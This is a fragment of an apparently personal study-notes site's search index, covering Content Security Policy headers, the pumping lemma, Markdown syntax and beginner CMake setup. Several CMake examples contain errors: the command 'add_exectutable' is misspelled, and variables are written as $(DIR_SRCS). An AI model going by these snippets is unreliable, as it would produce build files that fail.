<code>&amp;#39;</code> <p></p> <p>3) CSP: Content Security Policy</p> <p>Content-Security-Policy HTTP header allows the response to specify white-list, instructs the browser to only execute or render resources from those sources | \u5141\u8bb8 response \u6307\u5b9a\u767d\u540d\u5355\uff0c\u6307\u793a\u6d4f\u89c8\u5668\u4ec5\u6267\u884c\u6216\u5448\u73b0\u6765\u81ea\u8fd9\u4e9b\u6765\u6e90\u7684\u8d44\u6e90</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>Content-Security-Policy: script-src 'self' http://b.com; object-src 'none'; style-src cdn.example.org third-party.org; child-src https; img-src *\n</code></pre> <ul> <li>Allow scripts only from the server or from <code>http://b.com</code>, but not from anywhere else</li> <li><code>&lt;object&gt;</code> \u6807\u7b7e\uff1a\u4e0d\u5141\u8bb8\u4efb\u4f55\u6765\u6e90</li> <li>\u6837\u5f0f\u8868\uff1a\u53ea\u5141\u8bb8\u4ece <code>cdn.example.org</code> \u548c <code>third-party.org</code> \u52a0\u8f7d</li> <li>frame\uff1a\u53ea\u5141\u8bb8\u4f7f\u7528 <code>https</code> \u52a0\u8f7d</li> <li>Allow images to be loaded from anywhere</li> </ul> <ol> <li> <p>\u826f\u6027\uff0c\u65e0\u5bb3\u7684\u00a0\u21a9</p> </li> </ol>"}, {"location": "Triviality/PumpingLemma/", "title": "Pummping Lemma", "text": "<p> \u7ea6 300 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>Reference</p> <ul> <li> wiki - Pummping Lemma</li> </ul>"}, {"location": "Triviality/PumpingLemma/#statement", "title": "Statement", "text": "<p>Let \\(L\\) be a regular language. Then there exists a number \\(p\\) (the \u201cpumping length\u201d) such that any string \\(s\\) in \\(L\\) of length at least \\(p\\) can be divided into three pieces, \\(s = xyz\\), satisfying the following conditions:</p> <ol> <li>For each \\(i \\geq 0\\), the string \\(xy^iz\\) is in \\(L\\).</li> <li>The length of \\(y\\) is greater than 0.</li> <li>The length of \\(xy\\) is at most \\(p\\).</li> </ol> <p>\u610f\u601d\u5c31\u662f\u8bf4\uff1a\u5982\u679c\u4e00\u4e2a\u8bed\u8a00 \\(L\\) \u662f\u6b63\u5219\u7684\uff0c\u90a3\u4e48\u5b58\u5728\u4e00\u4e2a\u6570 \\(p\\)\uff08\u79f0\u4e3a\u201cpumping length\u201d\uff09\uff0c\u4f7f\u5f97\u4efb\u4f55\u957f\u5ea6\u81f3\u5c11\u4e3a \\(p\\) \u7684\u5b57\u7b26\u4e32 \\(s\\) \u90fd\u53ef\u4ee5\u88ab\u5206\u4e3a\u4e09\u90e8\u5206 \\(s = xyz\\)\uff0c\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\uff1a</p> <ol> <li>\u5bf9\u4e8e\u4efb\u4f55 \\(i \\geq 0\\)\uff0c\u5b57\u7b26\u4e32 \\(xy^iz\\) \u90fd\u5728 \\(L\\) \u4e2d\u3002</li> <li>\u5b57\u7b26\u4e32 \\(y\\) \u7684\u957f\u5ea6\u5927\u4e8e 0\u3002</li> <li>\u5b57\u7b26\u4e32 \\(xy\\) \u7684\u957f\u5ea6\u6700\u591a\u4e3a \\(p\\)\u3002</li> </ol>"}, {"location": "Triviality/PumpingLemma/#proof", "title": "Proof", "text": "<p>TODO</p>"}, {"location": "Triviality/PumpingLemma/#application", "title": "Application", "text": "<p>\u5047\u5b9a\u4e00\u4e2a\u8bed\u8a00</p> \\[ L = \\{0^n1^n | n \\geq 0\\} \\] <p>\u6211\u4eec\u6765\u8bc1\u660e\u8fd9\u4e2a\u8bed\u8a00\u4e0d\u662f\u6b63\u5219\u7684\u3002</p> <ol> <li>\u5047\u8bbe\u4e00\u4e2a\u5b57\u7b26\u4e32 \\(s = 0^p1^p = xyz\\)\uff0c\u5176\u4e2d \\(|xy| \\leq p\\)\uff0c\\(|y| &gt; 0\\)\u3002</li> <li>\u5982\u679c \\(y\\) \u53ea\u5305\u542b 0\uff0c\u90a3\u4e48 \\(xy^2z\\) \u4e2d 0 \u7684\u6570\u91cf\u4f1a\u8d85\u8fc7 1 \u7684\u6570\u91cf\uff0c\u56e0\u6b64 \\(xy^2z \\notin L\\)\u3002</li> <li>\u5982\u679c \\(y\\) \u5305\u542b 1\uff0c\u90a3\u4e48 \\(xy^0z\\) \u4e2d 0 \u7684\u6570\u91cf\u4f1a\u5c11\u4e8e 1 \u7684\u6570\u91cf\uff0c\u56e0\u6b64 \\(xy^0z \\notin L\\)\u3002</li> <li>\u5982\u679c \\(y\\) \u540c\u65f6\u5305\u542b 0 \u548c 1\uff0c\u90a3\u4e48\u4e0d\u6ee1\u8db3 \\(|xy| \\leq p\\) \u7684\u6761\u4ef6\u3002</li> <li>\u56e0\u6b64\uff0c\u8fd9\u4e2a\u8bed\u8a00\u4e0d\u662f\u6b63\u5219\u7684\u3002</li> </ol>"}, {"location": "Triviality/markdown/", "title": "\u90e8\u5206Markdown\u8bed\u6cd5", "text": "<p> \u7ea6 520 \u4e2a\u5b57  5 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Note</p> <p>\u4e00\u4e9b\u7b80\u5355\u7684markdown\u8bed\u6cd5(\u90e8\u5206\u8bed\u6cd5\u5728\u4e0d\u540cmarkdown\u7f16\u8bd1\u5668\u4e0a\u6709\u5dee\u522b)</p>"}, {"location": "Triviality/markdown/#_1", "title": "\u5173\u4e8e\u6807\u9898", "text": "<ol> <li>\u4e00\u7ea7\u6807\u9898 \u4f7f\u7528\u547d\u4ee4\uff1a\u2019<code>#</code>\u2019+\u2019<code>\u5185\u5bb9</code>\u2018</li> <li>\u4e8c\u7ea7\u6807\u9898 \u4f7f\u7528\u547d\u4ee4\uff1a\u2019<code>##</code>\u2019+\u2019<code>\u5185\u5bb9</code>\u2018</li> <li>\u4e09\u7ea7\u6807\u63d0 \u4f7f\u7528\u547d\u4ee4\uff1a\u2019<code>###</code>\u2019+\u2019<code>\u5185\u5bb9</code>\u2018</li> <li>\u56db\u7ea7\u6807\u9898 \u4f7f\u7528\u547d\u4ee4\uff1a\u2019<code>####</code>\u2019+\u2019<code>\u5185\u5bb9</code>\u2018</li> <li>\u4e94\u7ea7\u6807\u9898 \u4f7f\u7528\u547d\u4ee4\uff1a\u2019<code>#####</code>\u2019+\u2019<code>\u5185\u5bb9</code>\u2018</li> <li>\u516d\u7ea7\u6807\u9898 \u4f7f\u7528\u547d\u4ee4\uff1a\u2019<code>######</code>\u2019+\u2019<code>\u5185\u5bb9</code>\u2018</li> </ol>"}, {"location": "Triviality/markdown/#_2", "title": "\u52a0\u7c97\u3001\u503e\u659c\u3001\u4e0b\u5212\u7ebf\u3001\u5220\u9664\u7ebf\u3001\u6807\u8bb0\u6587\u672c", "text": "<ol> <li>\u52a0\u7c97 \u7684\u547d\u4ee4\uff1a\u2019<code>**</code>\u2019+\u2019<code>\u5185\u5bb9</code>\u2019+\u2019<code>**</code>\u2018(\u8f93\u5165\u4e4b\u540e\u6572\u7a7a\u683c\u5373\u53ef\u5c06\u4e24\u4e2a<code>**</code>\u4e4b\u95f4\u7684\u5185\u5bb9\u52a0\u7c97) or \u2018<code>__</code>\u2019+\u2019<code>\u5185\u5bb9</code>\u2019+\u2019<code>__</code>\u2018\uff08\u4e24\u4e2a\u4e0b\u5212\u7ebf\uff09\uff0c\u4e24\u4e2a<code>**</code>\u4e4b\u95f4\u65e0\u7a7a\u683c \uff0c\u6216\u8005\u4f7f\u7528\u5feb\u6377\u952e<code>Ctrl</code>+<code>B</code></li> <li>\u503e\u659c \u7684\u547d\u4ee4\uff1a\u2019<code>*</code>\u2019+\u2019<code>\u5185\u5bb9</code>\u2019+\u2019<code>*</code>\u2018\uff08\u540c\u6837\u9700\u8981\u5728\u7ed3\u675f\u65f6\u6572\u51fb\u7a7a\u683c\uff09or\u2019 <code>_</code>\u2019+\u2019<code>\u5185\u5bb9</code>\u2019+\u2019<code>_</code>\u2018\uff08\u4e00\u4e2a\u4e0b\u5212\u7ebf\uff09\uff0c\u6216\u8005\u4f7f\u7528\u5feb\u6377\u952e<code>Ctrl</code>+<code>I</code></li> <li>\u4e0b\u5212\u7ebf  \uff1a\u2019<code>&lt;u&gt;</code>\u2019+\u2019<code>\u5185\u5bb9</code>\u2019+\u2019<code>&lt;/u&gt;</code>\u2018\uff0c\u6216\u8005\u4f7f\u7528\u5feb\u6377\u952e<code>Ctrl</code>+<code>U</code></li> <li>\u5220\u9664\u7ebf\uff1a\u2019<code>~~</code>\u2018 + \u5185\u5bb9 + \u2018<code>~~</code>\u2019\uff0c\u6216\u8005\u4f7f\u7528\u5feb\u6377\u952e<code>Shift</code>+<code>Ctrl</code> + <code>X</code></li> <li>\u6807\u8bb0 \uff1a\u2018<code>==</code>\u2019 + \u2018<code>\u5185\u5bb9</code>\u2019+\u2018<code>==</code>\u2019\uff08\u66f4\u597d\u7528\u4e00\u70b9\uff09\uff0c\u6216\u8005\u4f7f\u7528<code>Alt</code> + <code>Ctrl</code> + <code>H</code>\uff08\u6211\u7684\u4e0d\u597d\u7528\uff09</li> </ol>"}, {"location": "Triviality/markdown/#_3", "title": "\u5206\u5272\u7ebf", "text": "<pre><code>\u4f7f\u7528`*** `+ `Enter` \u6216\u8005 `---` + `Enter`\u5c31\u53ef\u4ee5\u4e86\n</code></pre>"}, {"location": "Triviality/markdown/#_4", "title": "\u5f15\u7528", "text": "<pre><code>\u5728\u884c\u9996\u4f7f\u7528 ' `\u300b`'or ' `&gt;`' + '`\u7a7a\u683c`'\n</code></pre> <p>\u5f88\u591a<code>markdown</code>\u7f16\u8f91\u5668\u53ea\u652f\u6301 <code>&gt;</code></p>"}, {"location": "Triviality/markdown/#_5", "title": "\u5217\u8868", "text": "<ol> <li>\u6709\u5e8f\u5217\u8868\u2192\u4f7f\u7528\u2019<code>\u6570\u5b57</code>\u2019+\u2019<code>.</code>\u2019+\u2019<code>\u7a7a\u683c</code>\u2019 \u6216\u8005 \u4f7f\u7528\u5feb\u6377\u952e<code>Shift</code> + <code>Ctrl</code>+<code>7</code></li> <li>\u65e0\u5e8f\u5217\u8868\u2192\u4f7f\u7528\u2019<code>+</code>\u2018or \u2018<code>-</code>\u2018or \u2018<code>*</code>\u2019+\u2019<code>\u7a7a\u683c</code>\u2019 \u6216\u8005 \u4f7f\u7528\u5feb\u6377\u952e<code>Shift</code> + <code>Ctrl</code> + <code>8</code></li> <li>\u793a\u4f8b\u5982\u4e0b\uff1a</li> <li>(\u5728\u4fdd\u7559\u5217\u8868\u8fde\u7eed\u6027\u7684\u540c\u65f6\u5728\u5217\u8868\u4e2d\u6dfb\u52a0\u53e6\u4e00\u4e2a\u5143\u7d20\uff0c\u8bf7\u5c06\u8be5\u5143\u7d20\u7f29\u8fdb\u56db\u4e2a\u7a7a\u683c\u6216\u4e00\u4e2a\u5236\u8868\u7b26) - \u4e00\u7ea7\u65e0\u5e8f\u5217\u8868\u5728\u4f7f\u7528<code>Tab</code>\u952e\u53ef\u4ee5\u8fdb\u5165\u4e0b\u4e00\u7ea7\uff0c\u5982\u4e0b\u7a7a\u5fc3\u5706\u5708\u4e3a<code>*</code>+<code>space</code>+<code>tab</code></li> </ol>"}, {"location": "Triviality/markdown/#code", "title": "Code", "text": "<ol> <li>\u884c\u5185\u4ee3\u7801\uff1a \u5728\u6587\u5b57\u5757\u4e24\u8fb9\u52a0\u4e0a ` </li> <li>\u4ee3\u7801\u5757</li> </ol> <p>Example</p> <p>bubble_sort.py<pre><code>def bubble_sort(items):\n    for i in range(len(items)):\n        for j in range(len(items) - 1 - i):\n            if items[j] &gt; items[j + 1]:\n                items[j], items[j + 1] = items[j + 1], items[j]\n</code></pre> <pre><code>    ``` py title=\"bubble_sort.py\"\n    def bubble_sort(items):\n        for i in range(len(items)):\n            for j in range(len(items) - 1 - i):\n                if items[j] &gt; items[j + 1]:\n                    items[j], items[j + 1] = items[j + 1], items[j]\n    ```\n</code></pre></p>"}, {"location": "Triviality/markdown/#_6", "title": "\u56fe\u7247\u76f8\u5173", "text": "<ul> <li>\u63d2\u5165\u56fe\u7247\u683c\u5f0f <code>![\u56fe\u7247\u63cf\u8ff0](\u94fe\u63a5)</code></li> <li>\u5c45\u4e2d \u2014 <code>![\u56fe\u7247\u63cf\u8ff0](\u94fe\u63a5#pic_center)</code> or \u4f7f\u7528 html \u8bed\u6cd5</li> <li>\u8bbe\u7f6e\u56fe\u7247\u5927\u5c0f \u2014 \u8c03\u6574\u5bbd\u9ad8: <code>![\u56fe\u7247\u63cf\u8ff0](\u94fe\u63a5 =100x100)</code> </li> </ul> <p>\u867d\u7136\u4f46\u662f\uff0c\u8fd8\u662f\u5efa\u8bae\u76f4\u63a5\u7528 html , \u5982 <code>&lt;img src=\"\u94fe\u63a5\" width=\"100\" height=\"100\" alt=\"\u56fe\u7247\u63cf\u8ff0\" align=center /&gt;</code> Typora \u4e0a\u8ff0 html \u4ee3\u7801\u8c8c\u4f3c\u4e0d\u8d77\u4f5c\u7528\uff0c\u672c\u4eba\u4f7f\u7528 <code>&lt;center&gt;&lt;img src=\"\"/&gt;&lt;/center&gt;</code></p>"}, {"location": "Triviality/markdown/#_7", "title": "\u6570\u5b66\u516c\u5f0f&amp;\u7b26\u53f7", "text": "<p>\u5747\u4f7f\u7528<code>$</code>+<code>\u4ee3\u7801</code>+<code>$</code>+<code>\u7a7a\u683c</code>\u53ef\u4ee5\u6253\u51fa\uff0c\u4f8b\u5982 <code>$\\alpha$</code></p> <p>\u539f\u5730\u5740</p> <p>Markdown</p>"}, {"location": "Triviality/CMake/", "title": "CMake", "text": "<p> \u7ea6 72 \u4e2a\u5b57 </p> <p>Abstract</p> <ul> <li>\u4e4b\u524d\u53ea\u4e86\u89e3\u8fc7\u4e00\u70b9\u70b9 Makefile\u3002 \u7531\u4e8e\u8981\u7528\u5b83\u6765\u90e8\u7f72\u81ea\u5df1 VSCode \u7684\u9879\u76ee\u7b49\uff0c\u4e8e\u662f\u6d45\u6d45\u8bb0\u5f55\u4e00\u4e0b\u5b66 CMake \u7684\u8fc7\u7a0b</li> <li>\u7531\u4e8e\u5b66\u4e60\u65f6\u95f4\u6bb5\uff0c\u7b14\u8bb0\u4e0d\u4f1a\u5f88\u7cfb\u7edf\uff0c\u4e3b\u8981\u9488\u5bf9\u53ef\u4ee5\u6210\u529f\u94fe\u63a5\u81ea\u5df1\u7684\u9879\u76ee</li> </ul> <p>To Be Continued</p>"}, {"location": "Triviality/CMake/Lec01/", "title": "\u5b89\u88c5 &amp; \u914d\u7f6e &amp; \u6700\u7b80\u5355\u7684\u8bd5\u7f16\u8bd1", "text": "<p> \u7ea6 499 \u4e2a\u5b57  7 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <p>\u82ef\u4eba\u4f7f\u7528\u7684\u662f Windows + bash + VSCode</p>"}, {"location": "Triviality/CMake/Lec01/#_2", "title": "\u5b89\u88c5", "text": "<ul> <li>\u9700\u8981\u5b89\u88c5 CMake\u3001MinGW <p>\u5177\u4f53\u5b89\u88c5\u6559\u7a0b\u4e0d\u518d\u8d58\u8ff0</p> </li> </ul>"}, {"location": "Triviality/CMake/Lec01/#_3", "title": "\u914d\u7f6e", "text": "<ul> <li>\u5c06 CMake \u548c MinGW \u914d\u7f6e\u5230\u7cfb\u7edf\u8def\u5f84</li> <li>\u5728 <code>bash</code> \u4e2d\u4f7f\u7528 <code>gcc --version</code> \u548c <code>cmake --version</code> \u68c0\u9a8c\u662f\u5426\u914d\u7f6e\u5230\u7cfb\u7edf\u8def\u5f84<ul> <li>\u5f53\u51fa\u73b0\u7248\u672c\u4fe1\u606f\u7684\u65f6\u5019\u5373\u914d\u7f6e\u6210\u529f</li> </ul> </li> <li>VSCode \u914d\u7f6e<ul> <li>\u5b89\u88c5\u4e00\u4e9b\u63d2\u4ef6 \u2014\u2014 <code>CMake</code> &amp; <code>CMake Tools</code></li> <li>\u5728 VSCode \u4e2d <code>ctrl+shift+p</code> \u8f93\u5165 <code>&gt; CMake: \u914d\u7f6e</code>\uff0c \u4f1a\u51fa\u73b0\u4e0b\u5217\u7f16\u8bd1\u5de5\u5177\u94fe\u9009\u62e9\u6846 (\u82e5\u672a\u51fa\u73b0\u53ef\u80fd\u662f\u672a\u914d\u7f6e\u7cfb\u7edf\u8def\u5f84 or VSCode \u91cd\u542f\u8bd5\u8bd5) </li> </ul> </li> </ul>"}, {"location": "Triviality/CMake/Lec01/#_4", "title": "\u8bd5\u7f16\u8bd1", "text": "<ul> <li> <p>\u5728\u6587\u4ef6\u5939\u4e2d\u521b\u5efa\u4e00\u4e2a <code>main.cpp</code> \u548c <code>CMakeLists.txt</code></p> <ol> <li>Internet \u91cc\u6709\u4e00\u79cd\u65b9\u6cd5\u662f\u548c\u4e4b\u524d\u4e00\u6837 <code>&gt; CMake: \u914d\u7f6e</code> \u9009\u62e9\u7f16\u8bd1\u5de5\u5177\u94fe\uff0c\u968f\u540e\u4f1a\u81ea\u52a8\u5f53\u524d\u76ee\u5f55\u4e0b\u751f\u6210\u4e00\u4e2a <code>build</code> \u6587\u4ef6\u5939\uff0c\u8f93\u5165 <code>cmake ..</code> (\u82e5\u7535\u8111\u5b89\u88c5\u4e86 VS)</li> </ol> <p>\u8e29\u5751</p> <ul> <li>\u53ef\u80fd\u662f\u6211\u7684\u6709\u5f88\u591a\u5de5\u4f5c\u533a\u7684\u539f\u56e0\uff0c\u5728\u6211\u7684\u7535\u8111\u4e2d\u8fd9\u79cd\u65b9\u6cd5\u6709\u65f6\u4e0d\u6210\u529f\u3002\u6211\u4fbf\u91c7\u7528\u4e0b\u4e00\u79cd\u65b9\u6cd5\u3002</li> <li>\u6ce8\u610f: \u56e0\u4e3a windows \u4e2d cmake \u9ed8\u8ba4\u4f7f\u7528 nmake \u7a0b\u5e8f (\u6240\u4ee5\u8f93\u5165 <code>cmake ..</code> \u65f6\u4f1a\u63d0\u793a\u627e\u4e0d\u5230 nmake), \u56e0\u6b64\u9700\u8981\u6307\u660e cmake \u8981\u751f\u6210 MinGW, make \u4f7f\u7528\u7684 makefile \u6587\u4ef6: <code>cmake -G \"MinGW Makefiles ..\"</code></li> <li>\u5982\u679c\u6b64\u65f6\u51fa\u73b0\u95ee\u9898 </li> </ul> <pre><code>CMake Error: Error: generator : MinGW Makefiles\nDoes not match the generator used **previously: NMake** Makefiles\nEither remove the CMakeCache.txt file and CMakeFiles directory or choose a different binary directory.\n</code></pre> <ul> <li>\u539f\u56e0: cmake \u4f1a\u5728\u4e0a\u4e00\u6b21\u6267\u884c\u6587\u4ef6\u7684\u57fa\u7840\u4e0a\u76f4\u63a5\u6267\u884c\uff0c\u4f46\u4e0a\u6b21\u4f7f\u7528\u7684\u662f nmake \u6240\u4ee5\u4f1a\u51fa\u9519\u3002\u5c06 build \u5168\u90e8\u5220\u9664\u518d\u6267\u884c\u5c31\u53ef\u4ee5\u4e86</li> </ul> <ol> <li> <p>\u7b2c\u4e8c\u79cd\u529e\u6cd5\uff0c\u53ef\u4ee5\u5728 <code>bash</code> \u4e2d </p> <pre><code>$ mkdir build\n$ cd build\n$ cmake -G\"MinGW Makefiles\" ..\n</code></pre> </li> </ol> </li> <li> <p>\u6267\u884c\u540e\uff0c\u9879\u76ee\u4f1a\u751f\u6210\u5728 build \u6587\u4ef6\u5939\u4e2d\uff0c\u4f7f\u7528 <code>make</code> \u5373\u53ef\u751f\u6210\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u968f\u540e\u6267\u884c\u5373\u53ef</p> \u8e29\u5751 again <ul> <li>\u4f7f\u7528 MinGW \u4e00\u822c\u4f1a\u663e\u793a\u6ca1\u6709 make, \u539f\u56e0\u662f <code>MinGW/bin</code> \u4e2d\u6267\u884c\u6587\u4ef6\u540d\u4e0d\u662f <code>make</code> \u800c\u662f <code>mingw32-make</code> (maybe)</li> <li>\u603b\u4e4b\u8981\u4e48\u7528 <code>mingw32-make</code> \u4ee3\u66ff <code>make</code> \u6307\u4ee4 or \u62f7\u8d1d\u4e00\u4e2a <code>mingw32-make</code> \u5e76\u91cd\u547d\u540d\u4e3a <code>make</code></li> </ul> </li> </ul> Tips <ul> <li>\u4e0a\u8ff0\u5efa build \u6587\u4ef6\u5939\u4e0d\u662f\u5fc5\u987b\u7684\uff0c\u4f46\u4f7f\u7528 build \u4f1a\u4f7f\u9879\u76ee\u66f4\u6709\u5e8f\uff1b</li> <li>\u4e5f\u53ef\u4e5f\u76f4\u63a5\u4f7f\u7528 <code>cmake -G\"MinGW Makefiles\" .</code> \u4e4b\u524d\u7684 <code>..</code> \u610f\u601d\u662f\u4e0a\u4e00\u7ea7\u76ee\u5f55\u4e2d\u7684 <code>CMakeLists.txt</code></li> </ul>"}, {"location": "Triviality/CMake/Lec02/", "title": "CMake Note", "text": "<p> \u7ea6 485 \u4e2a\u5b57  52 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p><code>CMakeLists.txt</code></p>"}, {"location": "Triviality/CMake/Lec02/#_1", "title": "\u5355\u4e2a\u6e90\u6587\u4ef6", "text": "<p>\u53ea\u6709\u4e00\u4e2a\u6e90\u6587\u4ef6 <code>main.c</code></p> <pre><code># CMake \u6700\u4f4e\u7248\u672c\u53f7\u8981\u6c42\ncmake_minimum_required (VERSION 2.6)\n# \u9879\u76ee\u4fe1\u606f\nproject (Example1)\n# \u6307\u5b9a\u751f\u6210\u76ee\u6807\nadd_exectutable(Example main.c)\n</code></pre> <ul> <li>CMake \u4e2d\u7684\u547d\u4ee4\u662f\u4e0d\u533a\u5206\u5927\u5c0f\u5199\u7684\uff0c\u547d\u4ee4\u7531\u547d\u4ee4\u540d\u79f0\u3001\u5c0f\u62ec\u53f7\u548c\u53c2\u6570\u7ec4\u6210 (\u53c2\u6570\u4e4b\u95f4\u4f7f\u7528\u7a7a\u683c\u8fdb\u884c\u95f4\u9694)</li> <li>\u5bf9\u4e8e\u4e0a\u8ff0 CMakeLists.txt<ul> <li><code>cmake_minimum_required</code> : \u662f\u6307\u5b9a\u8fd0\u884c\u6240\u9700\u7684 CMake \u7684\u6700\u4f4e\u7248\u672c</li> <li><code>project</code> : \u53c2\u6570\u503c <code>Example1</code> \uff0c\u8868\u793a\u9879\u76ee\u7684\u540d\u79f0\u662f <code>Example1</code></li> <li><code>add_executable</code> : \u8868\u793a\u5c06 main.c \u6e90\u6587\u4ef6\u7f16\u8bd1\u6210\u4e00\u4e2a\u540d\u4e3a <code>Example</code> \u7684\u53ef\u6267\u884c\u6587\u4ef6</li> </ul> </li> <li>\u7f16\u8bd1\u9879\u76ee<ul> <li>\u5728\u5f53\u524d\u76ee\u5f55\u6267\u884c <code>cmake .</code> \u5f97\u5230 <code>Makefile</code> \u540e\u4f7f\u7528 <code>make</code> \u547d\u4ee4\u5f97\u5230 <code>Example1</code> \u53ef\u6267\u884c\u6587\u4ef6</li> </ul> </li> </ul>"}, {"location": "Triviality/CMake/Lec02/#_2", "title": "\u591a\u4e2a\u6e90\u6587\u4ef6", "text": "<ol> <li> <p>\u540c\u4e00\u76ee\u5f55\uff0c\u591a\u4e2a\u6e90\u6587\u4ef6 (Assume \u6b64\u65f6\u6e90\u4ee3\u7801\u6240\u5728\u76ee\u5f55\u4e3a <code>Example2</code>)</p> <ul> <li> <p>\u5047\u8bbe\u5de5\u7a0b\u76ee\u5f55\u4e3a\uff1a</p> <pre><code>Example2\n|\n+--- main.c\n|\n+--- Function.c\n|\n+--- Function.h\n</code></pre> </li> <li> <p>\u6b64\u65f6 <code>CMakeLists.txt</code> \u4fee\u6539\u4e3a</p> <pre><code># CMake \u6700\u4f4e\u7248\u672c\u53f7\u8981\u6c42\ncmake_minimum_required (VERSION 2.6)\n# \u9879\u76ee\u4fe1\u606f\nproject (Example2)\n# \u6307\u5b9a\u751f\u6210\u76ee\u6807\nadd_exectutable(Example main.c Function.c)\n</code></pre> </li> <li> <p>\u4f46\u82e5\u5c06\u6240\u6709\u7684\u6e90\u6587\u4ef6\u90fd\u6309\u7167\u4e0a\u8ff0\u5f62\u5f0f\u52a0\u5165\u4f1a\u5f88\u9ebb\u70e6 \u2014\u2014&gt; \u53ef\u4ee5\u4f7f\u7528 <code>aux_source_directory</code> \u547d\u4ee4\uff0c\u8be5\u547d\u4ee4\u4f1a\u67e5\u627e\u6307\u5b9a\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6e90\u6587\u4ef6\u7136\u540e\u5c06\u7ed3\u679c\u5b58\u8fdb\u6307\u5b9a\u53d8\u91cf\u540d (<code>aux_source_directory(&lt;dir&gt; &lt;variable&gt;)</code>)</p> </li> <li> <p>\u6b64\u65f6 <code>CMakeLists.txt</code> \u4fee\u6539\u4e3a</p> <pre><code># CMake \u6700\u4f4e\u7248\u672c\u53f7\u8981\u6c42\ncmake_minimum_required (VERSION 2.6)\n# \u9879\u76ee\u4fe1\u606f\nproject (Example2)\n# \u67e5\u627e\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6e90\u6587\u4ef6\u5e76\u5c06\u540d\u79f0\u4fdd\u5b58\u5230 DIR_SRCS \u53d8\u91cf\naux_source_directory(. DIR_SRCS)\n# \u6307\u5b9a\u751f\u6210\u76ee\u6807\nadd_exectutable(Example $(DIR_SRCS))\n</code></pre> </li> </ul> Problem <ul> <li>\u5728\u5b9e\u64cd\u4e2d\u53d1\u73b0\u7684\u95ee\u9898 \u2014\u2014 \u53d8\u91cf\u65e0\u6cd5\u4f7f\u7528</li> <li>\u4f8b\u5982\u4e0a\u8ff0 <code>DIR_SRCS</code> \u53d8\u91cf\u65e0\u6cd5\u4f7f\u7528\u4ece\u800c\u62a5\u9519\uff0c\u76ee\u524d\u8fd8\u672a\u53bb\u89e3\u51b3 (\u91c7\u7528\u6587\u4ef6\u540d\u5c31\u80fd\u6210\u529f\u7f16\u8bd1)</li> </ul> </li> <li> <p>\u591a\u4e2a\u76ee\u5f55\uff0c\u591a\u4e2a\u6e90\u6587\u4ef6 (\u6b64\u65f6\u6e90\u4ee3\u7801\u6240\u5728\u76ee\u5f55\u662f <code>Example3</code>)</p> <ul> <li> <p>\u5de5\u7a0b\u76ee\u5f55\u5982\u4e0b\uff1a</p> <pre><code>Example3\n|\n+--- main.c\n|\n+--- math/\n    |\n    +--- Function.c\n    |\n    +--- FUnction.h\n</code></pre> <ul> <li>\u6b64\u65f6\u9700\u8981\u5206\u522b\u5728\u9879\u76ee\u6839\u76ee\u5f55 <code>Example3</code> \u548c <code>math</code> \u76ee\u5f55\u4e2d\u5404\u7f16\u5199\u4e00\u4e2a <code>CMakeLists.txt</code>\u3002 \u4e3a\u65b9\u4fbf\u53ef\u4ee5\u5148\u5c06 <code>math</code> \u4e2d\u7684\u6587\u4ef6\u7f16\u8bd1\u6210\u9759\u6001\u5e93\u518d\u7531 <code>main</code> \u51fd\u6570\u8c03\u7528</li> <li> <p>\u6839\u76ee\u5f55\u4e2d\u7684 <code>CMakeLists.txt</code></p> <pre><code>```makefile\n# CMake \u6700\u4f4e\u7248\u672c\u53f7\u8981\u6c42\ncmake_minimum_required (VERSION 2.6)\n# \u9879\u76ee\u4fe1\u606f\nproject (Example3)\n# \u67e5\u627e\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6e90\u6587\u4ef6\u5e76\u5c06\u540d\u79f0\u4fdd\u5b58\u5230 DIR_SRCS \u53d8\u91cf\naux_source_directory(. DIR_SRCS)\n# \u6dfb\u52a0 math \u5b50\u76ee\u5f55\nadd_subdirectory(math)\n# \u6307\u5b9a\u751f\u6210\u76ee\u6807\nadd_exectutable(Example $(DIR_SRCS))\n# \u6dfb\u52a0\u94fe\u63a5\u5e93\ntarget_link_libraries(Example Functions)\n```\n</code></pre> <ul> <li><code>add_subdirectory(math)</code> \u6307\u660e\u672c\u9879\u76ee\u5305\u542b\u4e00\u4e2a\u5b50\u76ee\u5f55 <code>math</code> \uff0c\u6b64\u65f6 <code>math</code> \u4e2d\u7684 <code>CMakeLists.txt</code> \u548c\u6e90\u4ee3\u7801\u4e5f\u4f1a\u88ab\u5904\u7406</li> <li><code>target_link_libraries</code> \u6307\u660e\u53ef\u6267\u884c\u6587\u4ef6 <code>main</code> \u9700\u8981\u94fe\u63a5\u4e00\u4e2a\u540d\u4e3a <code>Functions</code> \u7684\u94fe\u63a5\u5e93</li> </ul> </li> <li> <p>\u5b50\u76ee\u5f55\u4e0b\u7684 <code>CMakeLists.txt</code></p> <pre><code>```makefile\n# \u67e5\u627e\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6e90\u6587\u4ef6\u5e76\u5c06\u540d\u79f0\u4fdd\u5b58\u5230 DIR_LIB_SRCS \u53d8\u91cf\naux_source_directory(. DIR_LIB_SRCS)\n# \u751f\u6210\u94fe\u63a5\u5e93\nadd_library (Functions $(DIR_LIB_SRCS))\n```\n</code></pre> <ul> <li><code>add_library</code> \u5c06 <code>math</code> \u76ee\u5f55\u4e2d\u7684\u6e90\u6587\u4ef6\u7f16\u8bd1\u6210\u9759\u6001\u94fe\u63a5\u5e93</li> </ul> </li> </ul> </li> </ul> </li> </ol>"}, {"location": "Triviality/CMake/Lec02/#_3", "title": "\u81ea\u5b9a\u4e49\u7f16\u8bd1\u9009\u9879", "text": "<p>\u6b64\u65f6\u6e90\u4ee3\u7801\u6240\u5728\u76ee\u5f55\u662f <code>Example4</code></p> <p>To Be Continued</p>"}, {"location": "Triviality/CS61A/", "title": "CS61A", "text": "<p> \u7ea6 31 \u4e2a\u5b57 </p> 